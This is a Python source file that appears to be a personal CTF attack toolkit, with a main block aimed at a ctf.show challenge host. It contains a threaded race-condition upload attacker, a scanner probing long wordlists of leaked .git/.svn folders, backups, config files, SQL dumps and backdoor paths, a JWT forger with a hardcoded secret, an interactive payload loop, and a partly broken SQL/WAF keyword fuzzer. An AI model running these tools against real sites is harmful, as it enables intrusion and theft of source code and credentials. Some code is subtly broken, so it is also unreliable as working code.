import requests
import jwt
import threading
from authlib.jose import jwt
import tqdm

# 竞争上传
class RaceUpload(threading.Thread):
    @staticmethod
    def go(url, upurl, fn, pararn='file'):
        threads = 20
        for i in range(threads):
            t = RaceUpload(url, upurl, fn, pararn)
            t.start()
        for i in range(threads):
            t.join()

    def __init__(self, url, upurl, fn, paran):
        threading.Thread.__init__(self)
        self.fn = fn
        self.url = url
        self.uploadUrl = upurl
        self.paran = paran

    def _get(self):
        r = requests.get(self.url)
        if r.status_code == 200:
            print("[*]RaceUpload success")
            return

    def _upload(self):
        file = {self.paran: open(self.fn, "rb"), }
        requests.post(self.uploadUrl, files=file)

    def run(self):
        while True:
            for i in range(5):
                self._get()
            for i in range(10):
                self._upload()
                self._get()


# 源码测试

def GetSCode(urlroot='', fileh='', filet='', head='', addurl=[]):
    hed = 'tmp dir backup test.php upload.php t.php login.php register register.php phpinfo.php .index.php index.php flag.php source config.php web root website %3f .%3f source.php user.php .source.php backup back www wwwroot temp .index.php index config dir' + fileh
    tls = '.phps .php .txt .vim .swp  .~ .7z .bak .phpc .tar .tar.gz  .zip .rar ' + filet

    add = ['.git', '.git/HEAD', '.git/index', '.git/config', '.git/description', '.idea/workspace.xml', 'README.MD',
           'README.md', 'README', '.gitignore', '.svn', '.svn/wc.db', '.svn/entries', '.hg', '.DS_store',
           'WEB-INF/web.xml',
           'WEB-INF/src/', 'WEB-INF/classes', 'WEB-INF/lib', 'WEB-INF/database.propertie', 'CVS/Root', 'CVS/Entries',
           '.bzr/',
           '_viminfo', '.viminfo', '%3f~', '%3f~1~', '%3f~2~', '%3f~3~', '%3f.save', '%3f.save1', '%3f.save2',
           '%3f.save3',
           '%3f.bak_Edietplus', '%3f.bak', '%3f.back', 'robots.txt', '.htaccess', '.bash_history', '.svn/', '.git/',
           '.swp',
           'plus', 'qq.txt', 'log.txt', 'web.rar', 'dede', 'admin', 'edit', 'Fckeditor', 'ewebeditor', 'bbs', 'Editor',
           'manage', 'shopadmin', 'web_Fckeditor', 'login', 'flag', 'webadmin', 'admin/WebEditor',
           'admin/daili/webedit',
           'login/', 'database/', 'tmp/', 'manager/', 'manage/', 'web/', 'admin/', 'shopadmin/', 'wp-includes/',
           'edit/',
           'editor/', 'user/', 'users/', 'admin/', 'home/', 'test/', 'administrator/', 'houtai/', 'backdoor/', 'flag/',
           'upload/', 'uploads/', 'download/', 'downloads/', 'manager/', '.svn/entries', '.ds_store', 'flag.php ',
           'fl4g.php',
           'f1ag.php', 'f14g.php', 'admin.php', '4dmin.php', 'adm1n.php', '4dm1n.php', 'admin1.php', 'admin2.php',
           'adminlogin.php', 'administrator.php', 'login.php', 'register.php', 'upload.php', 'home.php', 'log.php',
           'logs.php', 'config.php', 'member.php', 'user.php', 'users.php', 'robots.php', 'info.php', 'phpinfo.php',
           'backdoor.php', 'fm.php', 'example.php', 'mysql.bak', 'a.sql', 'b.sql', 'db.sql', 'bdb.sql', 'ddb.sql',
           'users.sql', 'mysql.sql', 'dump.sql', 'data.sql', 'rss.xml', 'crossdomain.xml', '1.txt', 'flag.txt',
           '/wp-config.php', '/configuration.php', '/sites/default/settings.php', '/config.php', '/config.inc.php',
           '/conf/_basic_config.php', '/config/site.php', '/system/config/default.php', '/framework/conf/config.php',
           '/mysite/_config.php', '/typo3conf/localconf.php', '/config/config_global.php', '/config/config_ucenter.php',
           '/lib', '/data/config.php', '/data/config.inc.php', '/includes/config.php', '/data/common.inc.php',
           '/caches/configs/database.php', '/caches/configs/system.php', '/include/config.inc.php',
           '/phpsso_server/caches/configs/database.php', '/phpsso_server/caches/configs/system.php', '404.php', 'user/',
           'users/', 'admin/', 'home/', 'test/', 'administrator/', 'houtai/', 'backdoor/', 'flag/', 'uploads/',
           'download/',
           'downloads/', 'manager/', 'phpmyadmin/', 'phpMyAdmin/']

    if not head == '': hed = head
    add.extend(addurl)
    for i in range(4):
        hed = hed.replace('  ', ' ')
        tls = tls.replace('  ', ' ')

    hl = [x.replace(' ', '') for x in hed.split(' ')]
    tl = [x.replace(' ', '') for x in tls.split(' ')]

    if not urlroot.startswith('http'):
        urlroot = 'http://' + urlroot
    if not urlroot.endswith('/'):
        urlroot += '/'
    print('urlroot:', urlroot)
    ret = {}
    for i in tqdm.tqdm(hl):
        for t in tl:
            try:
                file = i + t
                resp = requests.get(urlroot + file)
                req = '%d, %s' % (resp.status_code, len(resp.text))
                if req in ret:
                    ret[req] += file + ', '
                else:
                    ret[req] = file + ', '
            except:
                pass
    for i in tqdm.tqdm(add):
        try:
            resp = requests.get(urlroot + i)
            req = '%d, %s' % (resp.status_code, len(resp.text))
            if req in ret:
                ret[req] += i + ', '
            else:
                ret[req] = i + ', '
        except:
            pass
    print()
    for i in sorted(ret, reverse=True):
        if i.startswith('4'):
            ph = '\033[0;31m[-]'
        elif i.startswith('3'):
            ph = '\033[0;33m[-]'
        else:
            ph = '\033[0;32m[+]'
        print(ph + '%-15s=>[%s]' % (i, ret[i]))

    return ret


def jwtCreater(pl='', secret='xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6', header={"alg": "HS256", "typ": "JWT"}) -> str:
    return jwt.encode(header, pl, secret).decode('utf-8')


class tututu:
    url = ''
    req = requests
    encodeing = 'gbk'

    @staticmethod
    def insert_pie(txt=''):
        ret = ''
        for i in txt:
            ret += i
            ret += "''"

    def donothon(txt):
        return txt

    def __init__(self, url=''):
        self.url = url
        self.req = requests
        self.func = tututu.donothon

    def tutug(self, func=None):
        while True:
            pl = input("pl>")
            pl = self.func(pl)
            res = self.req.get(self.url + pl)
            res.encoding = self.encodeing
            o = res.text
            if not (func == None):
                o = func(res)
            print(o)
            print(pl)
            print(' - ' * 30)


class fuzzX:  # 未完成，waf千千万，实在难搞定啊
    sqlword = ['substr', 'hex', 'bin', 'conv', 'union', 'form', 'if', 'sleep', '/*', '/!', '--', '<>', 'and', 'or',
               'xor', 'delay', 'print', 'insert', 'select',
               'delete', 'updata', 'dis', 'length', 'right', 'left', 'mid', 'handler', 'having', 'replace', 'like',
               'join', 'as', 'limit', 'ord', 'ascii', 'char',
               'group_conca']
    sqlGJZ = [chr(i) for i in range(1, 127)].extend(sqlword)

    @staticmethod
    def chkget(url='', pl=sqlGJZ, func=lambda x, y: x in y):
        ret = []
        for i in tqdm.tqdm(fuzzX.sqlGJZ):
            txt = requests.get(url.format(i)).text
            if not func(pl, txt):
                ret.append(i)  # 我只关心失败的
        print(ret)
        return ret;

    @staticmethod
    def chkpost(url='', pl=sqlGJZ, dat={'a': '{}'}, key='a', func=lambda x, y: x in y):
        ret = []
        for i in tqdm.tqdm(fuzzX.sqlGJZ):
            dat[key].format(pl)
            txt = requests.post(url, data=dat).text
            if not func(pl, txt):
                ret.append(i)  # 我只关心失败的
        print(ret)
        return ret;


if __name__ == "__main__":
    GetSCode('https://ec54ec56-7a80-4677-af11-ceb7b8b26af1.chall.ctf.show')
    pass
